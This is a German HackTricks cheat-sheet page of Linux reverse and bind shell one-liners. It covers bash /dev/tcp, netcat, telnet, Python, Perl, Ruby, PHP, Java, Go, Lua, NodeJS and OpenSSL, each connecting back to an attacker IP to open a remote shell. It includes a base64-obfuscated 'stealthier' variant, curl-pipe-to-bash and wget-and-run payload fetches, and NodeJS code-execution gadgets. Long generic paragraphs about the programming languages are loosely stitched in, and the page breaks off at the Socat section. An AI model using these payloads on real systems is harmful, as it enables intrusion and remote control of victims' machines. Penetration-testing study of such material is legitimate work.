# Shells - Linux

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Wenn Sie Fragen zu einer dieser Shells haben, können Sie sie mit** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**

## Full TTY

**Sobald Sie eine Reverse-Shell erhalten haben,**[ **lesen Sie diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Vergessen Sie nicht, auch andere Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.

### Symbol sichere Shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell-Erklärung

1. **`bash -i`**: Dieser Teil des Befehls startet eine interaktive (`-i`) Bash-Shell.
2. **`>&`**: Dieser Teil des Befehls ist eine Kurzschreibweise für das **Umleiten sowohl der Standardausgabe** (`stdout`) als auch des **Standardfehlers** (`stderr`) zum **selben Ziel**.
3. **`/dev/tcp/<ANGREIFER-IP>/<PORT>`**: Dies ist eine spezielle Datei, die eine TCP-Verbindung zur angegebenen IP-Adresse und Port darstellt.
* Durch **Umleiten der Ausgabe- und Fehlerströme in diese Datei** sendet der Befehl effektiv die Ausgabe der interaktiven Shell-Sitzung an den Rechner des Angreifers.
4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) zum selben Ziel wie die Standardausgabe (`stdout`)** um.

### In Datei erstellen und ausführen
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Vorwärtsschale

Wenn Sie eine **RCE-Schwachstelle** in einer Linux-basierten Webanwendung finden, kann es vorkommen, dass das Erhalten einer umgekehrten Shell aufgrund von Iptables-Regeln oder anderen Filtern schwierig wird. In solchen Szenarien sollten Sie in Betracht ziehen, eine PTY-Shell im kompromittierten System mithilfe von Pipes zu erstellen.

Sie finden den Code unter [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Sie müssen nur Folgendes ändern:

* Die URL des verwundbaren Hosts
* Das Präfix und Suffix Ihrer Nutzlast (falls vorhanden)
* Die Art und Weise, wie die Nutzlast gesendet wird (Header? Daten? Zusätzliche Informationen?)

Dann können Sie einfach **Befehle senden** oder sogar den Befehl `upgrade` verwenden, um eine vollständige PTY zu erhalten (beachten Sie, dass Pipes mit einer ungefähren Verzögerung von 1,3 Sekunden gelesen und geschrieben werden).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Überprüfen Sie es unter [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet ist ein Netzwerkprotokoll, das verwendet wird, um eine Verbindung zu einem entfernten Computer herzustellen und eine interaktive Sitzung zu ermöglichen. Es ermöglicht die Fernsteuerung des entfernten Computers über die Befehlszeile.

### Verwendung von Telnet

Um Telnet zu verwenden, geben Sie den Befehl `telnet` gefolgt von der IP-Adresse oder dem Hostnamen des Zielcomputers ein. Beispiel:

```bash
telnet 192.168.0.1
```

Nachdem die Verbindung hergestellt wurde, können Sie Befehle eingeben und die Ausgabe des entfernten Computers anzeigen. Um die Verbindung zu trennen, verwenden Sie den Befehl `quit` oder drücken Sie die Tastenkombination `Ctrl+]` gefolgt von `q`.

### Sicherheitsrisiken

Telnet überträgt Daten im Klartext, was bedeutet, dass alle Informationen, die über Telnet gesendet werden, von Angreifern abgefangen und gelesen werden können. Aus diesem Grund wird die Verwendung von Telnet in der Regel nicht empfohlen. Es wird empfohlen, stattdessen sichere Protokolle wie SSH zu verwenden, die die Datenverschlüsselung unterstützen.

### Telnet-Exploits

Da Telnet unsicher ist, wurden im Laufe der Zeit verschiedene Exploits entwickelt, um Schwachstellen in Telnet-Implementierungen auszunutzen. Diese Exploits können verwendet werden, um unautorisierten Zugriff auf entfernte Systeme zu erlangen oder andere bösartige Aktivitäten durchzuführen. Es ist wichtig, dass Systemadministratoren ihre Systeme regelmäßig aktualisieren und sicherstellen, dass Telnet deaktiviert ist, um solche Exploits zu verhindern.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Angreifer**
```bash
while true; do nc -l <port>; done
```
Um den Befehl zu senden, schreiben Sie ihn auf, drücken Sie Enter und drücken Sie dann STRG+D (um STDIN zu stoppen)

**Opfer**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python ist eine leistungsstarke und vielseitige Programmiersprache, die häufig von Hackern verwendet wird. Mit Python können Sie verschiedene Aufgaben automatisieren und Skripte erstellen, um in verschiedenen Hacking-Szenarien zu helfen. Hier sind einige wichtige Punkte, die Sie über Python wissen sollten:

- **Einfache Syntax**: Python hat eine klare und einfache Syntax, die das Schreiben von Code erleichtert. Dies macht es zu einer idealen Sprache für Anfänger und erfahrene Entwickler.

- **Umfangreiche Bibliotheken**: Python verfügt über eine große Anzahl von Bibliotheken, die verschiedene Funktionen und Tools bieten. Diese Bibliotheken können Ihnen helfen, Aufgaben wie Netzwerkanalyse, Datenmanipulation, Web-Scraping und vieles mehr zu automatisieren.

- **Interaktive Shell**: Python bietet eine interaktive Shell, die es Ihnen ermöglicht, Codezeilen einzeln auszuführen und die Ergebnisse sofort zu sehen. Dies ist besonders nützlich beim Testen und Debuggen von Code.

- **Plattformunabhängigkeit**: Python ist plattformunabhängig, was bedeutet, dass Sie Ihren Code auf verschiedenen Betriebssystemen ausführen können, einschließlich Linux, Windows und macOS.

- **Community-Support**: Python hat eine große und aktive Community von Entwicklern, die bereit sind, bei Fragen und Problemen zu helfen. Es gibt auch viele Online-Ressourcen, Tutorials und Dokumentationen, die Ihnen helfen können, Ihre Python-Fähigkeiten zu verbessern.

Python ist eine wertvolle Sprache für Hacker, da sie Ihnen ermöglicht, komplexe Aufgaben zu automatisieren und effizienter zu arbeiten. Es ist wichtig, Ihre Python-Kenntnisse kontinuierlich zu erweitern und neue Bibliotheken und Tools zu erkunden, um Ihre Fähigkeiten als Hacker zu verbessern.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl ist eine interpretierte, hochgradig flexible und leistungsstarke Skriptsprache, die häufig für die Automatisierung von Aufgaben und die Entwicklung von Webanwendungen verwendet wird. Es bietet eine Vielzahl von Funktionen und Bibliotheken, die es Hackern ermöglichen, verschiedene Aufgaben auszuführen.

### Reverse Shell mit Perl

Perl kann verwendet werden, um einen Reverse Shell-Angriff durchzuführen. Ein Reverse Shell-Angriff ermöglicht es einem Angreifer, eine Verbindung zu einem infizierten System herzustellen und Befehle auszuführen. Hier ist ein Beispiel für einen Reverse Shell-Angriff mit Perl:

```perl
use Socket;
use FileHandle;

$ip = '192.168.0.1';
$port = 4444;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
$sin = sockaddr_in($port, inet_aton($ip));
connect(SOCKET, $sin);

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system('/bin/sh -i');
```

Dieses Perl-Skript stellt eine Verbindung zu einem Remote-Server unter der IP-Adresse '192.168.0.1' und dem Port 4444 her. Sobald die Verbindung hergestellt ist, werden die Standard-Ein- und Ausgabe sowie der Fehlerausgabestrom auf den Socket umgeleitet. Schließlich wird der Befehl '/bin/sh -i' ausgeführt, um eine interaktive Shell-Sitzung zu starten.

### Dateien mit Perl lesen und schreiben

Perl bietet auch Funktionen zum Lesen und Schreiben von Dateien. Dies kann nützlich sein, um sensible Informationen zu extrahieren oder Änderungen an Dateien vorzunehmen. Hier sind Beispiele für das Lesen und Schreiben von Dateien mit Perl:

#### Datei lesen

```perl
open(FILE, "<", "datei.txt") or die "Kann Datei nicht öffnen: $!";
while (<FILE>) {
    print $_;
}
close(FILE);
```

Dieses Perl-Skript öffnet die Datei "datei.txt" im Lese-Modus und liest den Inhalt Zeile für Zeile. Jede Zeile wird dann auf der Standardausgabe ausgegeben.

#### Datei schreiben

```perl
open(FILE, ">", "datei.txt") or die "Kann Datei nicht öffnen: $!";
print FILE "Hallo, Welt!\n";
close(FILE);
```

Dieses Perl-Skript öffnet die Datei "datei.txt" im Schreib-Modus und schreibt den Text "Hallo, Welt!" in die Datei.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby ist eine dynamische, objektorientierte Programmiersprache, die für ihre Einfachheit und Lesbarkeit bekannt ist. Sie wird häufig für die Entwicklung von Webanwendungen verwendet und bietet eine Vielzahl von Funktionen und Bibliotheken, die das Programmieren erleichtern.

### Installation

Um Ruby auf einem Linux-System zu installieren, können Sie den Paketmanager Ihrer Distribution verwenden. Zum Beispiel können Sie auf Ubuntu den folgenden Befehl ausführen:

```bash
sudo apt-get install ruby
```

### Ausführen von Ruby-Code

Um Ruby-Code auszuführen, können Sie den Befehl `ruby` gefolgt vom Dateinamen verwenden. Zum Beispiel:

```bash
ruby mein_script.rb
```

### Interaktiver Modus

Ruby bietet auch einen interaktiven Modus, in dem Sie Ruby-Code direkt eingeben und ausführen können. Um den interaktiven Modus zu starten, geben Sie einfach den Befehl `irb` in der Befehlszeile ein.

```bash
irb
```

### Grundlegende Syntax

Die Syntax von Ruby ist einfach und intuitiv. Hier sind einige grundlegende Konzepte:

- Variablen: In Ruby können Sie Variablen mit dem Zeichen `=` deklarieren und initialisieren. Zum Beispiel: `name = "John"`
- Datentypen: Ruby unterstützt verschiedene Datentypen wie Strings, Zahlen, Arrays und Hashes.
- Bedingungen: Sie können Bedingungen mit `if`, `else` und `elsif` in Ruby erstellen.
- Schleifen: Ruby bietet Schleifen wie `while`, `for` und `each`, um wiederholte Aktionen auszuführen.
- Funktionen: Sie können Funktionen in Ruby mit dem Schlüsselwort `def` definieren.

### Nützliche Ressourcen

- [Ruby-Dokumentation](https://www.ruby-lang.org/en/documentation/): Offizielle Dokumentation für Ruby.
- [RubyGems](https://rubygems.org/): Eine Sammlung von Ruby-Bibliotheken und -Programmen.
- [Ruby on Rails](https://rubyonrails.org/): Ein beliebtes Webframework, das auf Ruby basiert.

Ruby ist eine leistungsstarke Programmiersprache mit einer aktiven Community und einer Fülle von Ressourcen. Es lohnt sich, sie zu erkunden und zu lernen, um Ihre Programmierfähigkeiten zu erweitern.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP ist eine weit verbreitete serverseitige Skriptsprache, die hauptsächlich für die Entwicklung von Webanwendungen verwendet wird. Es bietet eine Vielzahl von Funktionen und Bibliotheken, die es Entwicklern ermöglichen, dynamische und interaktive Websites zu erstellen.

### PHP-Shell

Eine PHP-Shell ist ein Skript, das es einem Angreifer ermöglicht, eine Befehlszeilenschnittstelle auf einem verwundbaren Webserver zu öffnen. Mit einer PHP-Shell kann ein Angreifer verschiedene Aktionen ausführen, wie z.B. Dateien hochladen, herunterladen, löschen oder bearbeiten, Datenbanken manipulieren, Systembefehle ausführen und vieles mehr.

#### Reverse PHP-Shell

Eine Reverse PHP-Shell ist eine spezielle Art von PHP-Shell, die es einem Angreifer ermöglicht, eine Verbindung von einem verwundbaren Webserver zu einem Remote-Server herzustellen. Dies ermöglicht es dem Angreifer, den verwundbaren Webserver aus der Ferne zu steuern und verschiedene Aktionen auszuführen.

### PHP-Backdoor

Eine PHP-Backdoor ist ein Stück Schadcode, das in eine PHP-Datei eingefügt wird, um unbefugten Zugriff auf einen Webserver zu ermöglichen. Eine PHP-Backdoor kann verwendet werden, um vertrauliche Informationen zu stehlen, weitere Malware zu installieren, den Server zu kontrollieren und andere schädliche Aktivitäten durchzuführen.

### PHP-Deserialisierung

PHP-Deserialisierung ist ein Angriff, bei dem ein Angreifer eine Schwachstelle in der Deserialisierungsfunktion von PHP ausnutzt, um schädlichen Code einzuschleusen und auszuführen. Dies kann zu verschiedenen Sicherheitsproblemen führen, wie z.B. der Ausführung von Remote-Code, der Offenlegung sensibler Informationen oder der Umgehung von Sicherheitsmechanismen.

### PHP-Include-Leak

Ein PHP-Include-Leak tritt auf, wenn ein Angreifer eine Schwachstelle in der Include-Funktion von PHP ausnutzt, um den Inhalt einer Datei offenzulegen, auf die normalerweise kein Zugriff möglich ist. Dies kann dazu führen, dass vertrauliche Informationen wie Passwörter, Datenbankverbindungsdaten oder andere sensible Informationen preisgegeben werden.

### PHP-Remote-Code-Ausführung

PHP-Remote-Code-Ausführung tritt auf, wenn ein Angreifer eine Schwachstelle in einer PHP-Anwendung ausnutzt, um schädlichen Code auf dem Server auszuführen. Dies kann zu verschiedenen Sicherheitsproblemen führen, wie z.B. der Offenlegung sensibler Informationen, der Manipulation von Daten oder der Übernahme des Servers.

### PHP-Sicherheitslücken

PHP ist eine weit verbreitete Sprache, und wie bei jeder Software gibt es auch in PHP Sicherheitslücken. Diese Sicherheitslücken können von Angreifern ausgenutzt werden, um unbefugten Zugriff auf einen Webserver zu erlangen, Daten zu stehlen, den Server zu kontrollieren oder andere schädliche Aktivitäten durchzuführen. Es ist wichtig, PHP-Anwendungen regelmäßig zu aktualisieren und Sicherheitspatches zu installieren, um diese Sicherheitslücken zu schließen.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java ist eine objektorientierte Programmiersprache, die häufig für die Entwicklung von plattformübergreifenden Anwendungen verwendet wird. Sie wurde von Sun Microsystems entwickelt und ist bekannt für ihre Portabilität und Sicherheit. Java-Anwendungen werden in Bytecode kompiliert, der von der Java Virtual Machine (JVM) ausgeführt wird. Dies ermöglicht es, Java-Anwendungen auf verschiedenen Betriebssystemen auszuführen, ohne den Code neu zu schreiben.

Java bietet eine Vielzahl von Funktionen und Bibliotheken, die die Entwicklung von Anwendungen erleichtern. Es unterstützt die Vererbung, Polymorphie, Ausnahmebehandlung und andere wichtige Konzepte der objektorientierten Programmierung. Darüber hinaus verfügt Java über eine umfangreiche Standardbibliothek, die viele nützliche Klassen und Methoden enthält, um häufige Aufgaben zu vereinfachen.

Java-Anwendungen können auf verschiedenen Plattformen ausgeführt werden, einschließlich Desktop-Computern, Mobilgeräten und eingebetteten Systemen. Sie werden häufig für die Entwicklung von Webanwendungen, mobilen Apps, Unternehmenssoftware und Spielen verwendet.

Die Sicherheit von Java-Anwendungen ist ein wichtiger Aspekt, da Java-Code in einer Sandbox-Umgebung ausgeführt wird, die den Zugriff auf das Betriebssystem einschränkt. Dies hilft, potenziell schädlichen Code einzudämmen und die Integrität des Systems zu schützen.

Java bietet auch Unterstützung für die Netzwerkprogrammierung, Datenbankzugriff, Multithreading und andere fortgeschrittene Funktionen. Es ist eine beliebte Wahl für die Entwicklung von großen, skalierbaren Anwendungen, die eine hohe Leistung und Zuverlässigkeit erfordern.

Insgesamt ist Java eine leistungsstarke Programmiersprache, die sich durch ihre Portabilität, Sicherheit und umfangreiche Funktionalität auszeichnet. Sie wird von einer großen Entwicklergemeinschaft unterstützt und ist eine gute Wahl für die Entwicklung verschiedener Arten von Anwendungen.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat ist ein leistungsstarkes Kommandozeilen-Tool, das in der Lage ist, TCP- und UDP-Verbindungen herzustellen, zu senden und zu empfangen. Es ist eine verbesserte Version des traditionellen Netcat-Tools und bietet zusätzliche Funktionen und Sicherheitsverbesserungen.

### Installation

Ncat ist in den meisten Linux-Distributionen standardmäßig installiert. Wenn es nicht installiert ist, können Sie es mit dem Paketmanager Ihrer Distribution installieren. Zum Beispiel:

```bash
sudo apt-get install ncat
```

### Verwendung

Ncat kann auf verschiedene Weisen verwendet werden, um Netzwerkverbindungen herzustellen und Daten zu übertragen. Hier sind einige Beispiele:

- Herstellen einer TCP-Verbindung zu einem Remote-Host:

```bash
ncat <host> <port>
```

- Senden von Daten über eine TCP-Verbindung:

```bash
echo "Hello, world!" | ncat <host> <port>
```

- Empfangen von Daten über eine TCP-Verbindung:

```bash
ncat -l <port>
```

- Herstellen einer UDP-Verbindung zu einem Remote-Host:

```bash
ncat -u <host> <port>
```

- Senden von Daten über eine UDP-Verbindung:

```bash
echo "Hello, world!" | ncat -u <host> <port>
```

- Empfangen von Daten über eine UDP-Verbindung:

```bash
ncat -ul <port>
```

### Weitere Funktionen

Ncat bietet auch eine Vielzahl von erweiterten Funktionen, darunter:

- SSL/TLS-Verschlüsselung für sichere Kommunikation
- Portweiterleitung und Tunneling
- Dateiübertragung
- Remote-Shell-Zugriff
- Netzwerkskripting mit Lua

Weitere Informationen zu diesen Funktionen und deren Verwendung finden Sie in der Ncat-Dokumentation.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua ist eine leistungsstarke, effiziente und flexible Skriptsprache, die häufig für die Entwicklung von Spielen, Webanwendungen und eingebetteten Systemen verwendet wird. Es ist einfach zu erlernen und verfügt über eine einfache Syntax, die es Entwicklern ermöglicht, schnell Prototypen zu erstellen und komplexe Aufgaben zu automatisieren.

### Installation

Um Lua auf einem Linux-System zu installieren, können Sie den folgenden Befehl verwenden:

```bash
sudo apt-get install lua5.3
```

### Ausführen von Lua-Skripten

Um ein Lua-Skript auszuführen, verwenden Sie den Befehl `lua` gefolgt vom Dateinamen des Skripts:

```bash
lua script.lua
```

### Interaktiver Modus

Lua bietet auch einen interaktiven Modus, in dem Sie Lua-Code direkt eingeben und sofort Ergebnisse sehen können. Um den interaktiven Modus zu starten, geben Sie einfach den Befehl `lua` ohne Dateinamen ein:

```bash
lua
```

### Lua-Shell

Die Lua-Shell ist eine interaktive Umgebung, in der Sie Lua-Code eingeben und sofort Ergebnisse sehen können. Sie können die Lua-Shell starten, indem Sie den Befehl `lua` ohne Dateinamen eingeben oder einfach `lua` in den interaktiven Modus wechseln.

```bash
lua
```

### Lua-Module

Lua bietet eine Vielzahl von Modulen, die zusätzliche Funktionen und Bibliotheken bereitstellen. Sie können Module mit dem Befehl `require` in Ihr Skript laden:

```lua
local module = require("modulename")
```

### Lua-Dokumentation

Die offizielle Lua-Dokumentation ist eine wertvolle Ressource für Entwickler, die mehr über die Sprache und ihre Funktionen erfahren möchten. Sie können die Dokumentation online unter [https://www.lua.org/docs.html](https://www.lua.org/docs.html) finden.

### Zusammenfassung

Lua ist eine leistungsstarke und flexible Skriptsprache, die für die Entwicklung von Spielen, Webanwendungen und eingebetteten Systemen verwendet wird. Es bietet eine einfache Syntax, eine interaktive Shell und eine Vielzahl von Modulen, um Entwicklern bei der Automatisierung von Aufgaben zu helfen. Die offizielle Lua-Dokumentation ist eine wertvolle Ressource für weitere Informationen.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS ist eine Open-Source-Plattform, die auf der JavaScript-Laufzeitumgebung von Chrome basiert. Sie ermöglicht es Entwicklern, serverseitige Anwendungen mit JavaScript zu erstellen. NodeJS verwendet eine ereignisgesteuerte, nicht blockierende I/O-Architektur, die es ermöglicht, skalierbare und effiziente Anwendungen zu entwickeln.

### Installation

Um NodeJS auf einem Linux-System zu installieren, können Sie den folgenden Befehl verwenden:

```bash
sudo apt-get install nodejs
```

### Verwendung

Um eine NodeJS-Anwendung auszuführen, verwenden Sie den Befehl `node` gefolgt vom Dateinamen der JavaScript-Datei:

```bash
node app.js
```

### Paketverwaltung

NodeJS verwendet den Paketmanager npm (Node Package Manager), um externe Module und Bibliotheken zu verwalten. Sie können npm verwenden, um Pakete zu installieren, zu aktualisieren und zu entfernen. Hier sind einige nützliche Befehle:

- `npm install <paketname>`: Installiert ein Paket.
- `npm update <paketname>`: Aktualisiert ein Paket.
- `npm uninstall <paketname>`: Entfernt ein Paket.
- `npm search <paketname>`: Sucht nach einem Paket.
- `npm init`: Initialisiert ein neues NodeJS-Projekt.

### Sicherheit

Bei der Entwicklung von NodeJS-Anwendungen ist es wichtig, Sicherheitsaspekte zu berücksichtigen. Hier sind einige bewährte Sicherheitspraktiken:

- Aktualisieren Sie regelmäßig NodeJS und die verwendeten Pakete, um Sicherheitslücken zu schließen.
- Verwenden Sie sichere Authentifizierungs- und Autorisierungsmethoden, um unbefugten Zugriff zu verhindern.
- Validieren und filtern Sie Benutzereingaben, um vor Angriffen wie SQL-Injektionen und Cross-Site-Scripting (XSS) zu schützen.
- Implementieren Sie Sicherheitsmaßnahmen wie HTTPS-Verschlüsselung und Content Security Policy (CSP).
- Überwachen Sie die Anwendung auf verdächtige Aktivitäten und führen Sie regelmäßige Sicherheitsaudits durch.

NodeJS bietet eine leistungsstarke Plattform für die Entwicklung von serverseitigen Anwendungen mit JavaScript. Durch die Einhaltung bewährter Sicherheitspraktiken können Sie sicherstellen, dass Ihre Anwendungen geschützt sind und reibungslos funktionieren.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Der Angreifer (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Der Angreifer
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind-Shell

Eine Bind-Shell ist ein Mechanismus, der es einem Angreifer ermöglicht, eine Verbindung zu einem Zielrechner herzustellen und eine Shell-Sitzung zu starten. Socat ist ein vielseitiges Tool, das verwendet werden kann, um eine Bind-Shell auf einem Linux-System einzurichten.

Um eine Bind-Shell mit Socat einzurichten, müssen Sie den folgenden Befehl ausführen:

